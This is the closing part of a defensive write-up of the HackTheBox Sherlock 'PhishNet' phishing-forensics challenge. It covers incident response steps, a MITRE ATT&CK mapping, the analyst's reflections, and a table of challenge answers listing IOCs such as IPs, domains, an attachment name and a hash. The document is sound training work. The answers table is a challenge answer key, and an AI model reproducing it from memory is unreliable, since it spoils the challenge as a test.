**Post-Incident (24-72 hours):**
11. **IOC Distribution:** Share IOCs with threat intelligence community
12. **Detection Engineering:** Create/update SIEM rules to detect similar attacks
13. **User Awareness:** Send organization-wide security bulletin with examples
14. **Lessons Learned Meeting:** Review detection gaps, improve procedures

**Escalation Criteria:**
- Escalate to Tier 2 if: Attachment contains executable content
- Escalate to Tier 3/IR if: Evidence of malware execution on endpoint
- Escalate to Management if: Potential data breach or multiple compromised systems

This investigation reinforced that SOC analysis isn't just about finding indicators - it's about understanding the full attack chain, anticipating attacker actions, and implementing comprehensive defenses.

---

## MITRE ATT&CK Framework Mapping

| Tactic | Technique | Sub-Technique | Details |
|--------|-----------|---------------|---------|
| **Initial Access** | T1566 | T1566.001 - Spearphishing Attachment | Malicious .zip with .bat file |
| **Execution** | T1204 | T1204.002 - User Execution: Malicious File | User opens .bat file thinking it's PDF |
| **Defense Evasion** | T1036 | T1036.007 - Masquerading: Double File Extension | `.pdf.bat` extension spoofing |

---

## Resources & References

**Tools Documentation:**
- [ExifTool Documentation](https://exiftool.org/)
- [CyberChef Recipes](https://gchq.github.io/CyberChef/)
- [MITRE ATT&CK - T1566.001](https://attack.mitre.org/techniques/T1566/001/)

**Learning Resources:**
- [Email Header Analysis Guide](https://mxtoolbox.com/Public/Content/EmailHeaders/)
- [SPF Record Checker](https://mxtoolbox.com/spf.aspx)
- [File Extension Spoofing Techniques](https://attack.mitre.org/techniques/T1036/007/)

**Threat Intelligence:**
- VirusTotal: Check file hashes and IPs
- AbuseIPDB: Check sender IP reputation
- URLScan.io: Analyze phishing URLs

---

## Conclusion

This PhishNet investigation demonstrates a classic spearphishing attack targeting an organization's accounting department. The attacker used multiple social engineering techniques:

1. **Spoofed legitimate company** (Business Finance Ltd.)
2. **Created urgency** ("overdue invoice")
3. **Passed SPF checks** (legitimate-looking but attacker-controlled domain)
4. **Disguised malware** (`.pdf.bat` extension spoofing)

**Attack Success Factors:**
- Professional email format
- Passed SPF authentication (bypassing initial filters)
- Targeted accounting team (likely to process invoices)
- Double extension trick (evading user awareness)

**How This Could Be Prevented:**
- Email gateway sandbox analysis of attachments
- User training on file extension awareness
- Block executable files in ZIP attachments from external senders
- Implement DMARC to prevent domain spoofing

**Personal Reflection:**

Completing this challenge fundamentally changed how I view email security. Before this investigation, I assumed SPF/DKIM passing meant an email was safe. Now I understand that authentication and authorization are completely separate from legitimacy and trustworthiness.

The `.pdf.bat` discovery was particularly impactful. It's such a simple technique, yet incredibly effective because it exploits default Windows behavior that most users never think about. This reinforced that security isn't just about sophisticated exploits - often the simplest attacks are the most successful because they leverage human psychology and system defaults.

As a future SOC analyst, I would respond to this incident by:

1. **Immediately quarantining** the email across all inboxes
2. **Blocking** the sender IP and domain at the perimeter
3. **Checking SIEM logs** to identify if any users opened the attachment
4. **Running endpoint scans** for the malware hash on all systems
5. **Creating detection rules** for similar double-extension attacks
6. **Conducting user awareness training** with this specific example

The investigation also showed me the importance of **documentation**. In a real SOC, properly documenting analysis steps, findings, and IOCs ensures that:
- Other analysts can replicate the investigation
- Indicators can be shared with the security community
- Management understands the threat and business impact
- Future similar attacks can be detected automatically

This investigation reinforced the importance of **defense in depth** - no single security control would have stopped this attack, but multiple layers (email filtering, user training, endpoint protection) working together would significantly reduce the risk.

---

## Answers Summary

| Task | Question | Answer |
|------|----------|--------|
| 1 | What is the originating IP address of the sender? | `45.67.89.10` |
| 2 | Which mail server relayed this email before reaching the victim? | `203.0.113.25` |
| 3 | What is the sender's email address? | `finance@business-finance.com` |
| 4 | What is the 'Reply-To' email address specified in the email? | `support@business-finance.com` |
| 5 | What is the SPF (Sender Policy Framework) result for this email? | `pass` |
| 6 | What is the domain used in the phishing URL inside the email? | `secure.business-finance.com` |
| 7 | What is the fake company name used in the email? | `Business Finance Ltd.` |
| 8 | What is the name of the attachment included in the email? | `Invoice_2025_Payment.zip` |
| 9 | What is the SHA-256 hash of the attachment? | `8379c41239e9af845b2ab6c27a7509ae8804d7d73e455c800a551b22ba25bb4a` |
| 10 | What is the filename of the malicious file contained within the ZIP attachment? | `invoice_document.pdf.bat` |
| 11 | Which MITRE ATT&CK techniques are associated with this attack? | `T1566.001` |

---

## Metadata

**Author:** Arda Fidancı  
**Date:** November 16, 2025  
**Challenge:** HackTheBox Sherlock - PhishNet  
**HTB Profile:** https://app.hackthebox.com/profile/2467755  
**GitHub:** https://github.com/f23783

**Tags:** `#EmailForensics` `#Phishing` `#BlueTeam` `#IncidentResponse` `#MITRE` `#SOCAnalyst` `#ThreatHunting`

---

*This writeup is part of my cybersecurity portfolio demonstrating email forensics and phishing investigation capabilities. All analysis was performed in a controlled lab environment for educational purposes.*

**Disclaimer:** The IOCs and techniques described are from a simulated training environment and should only be used for defensive security purposes.
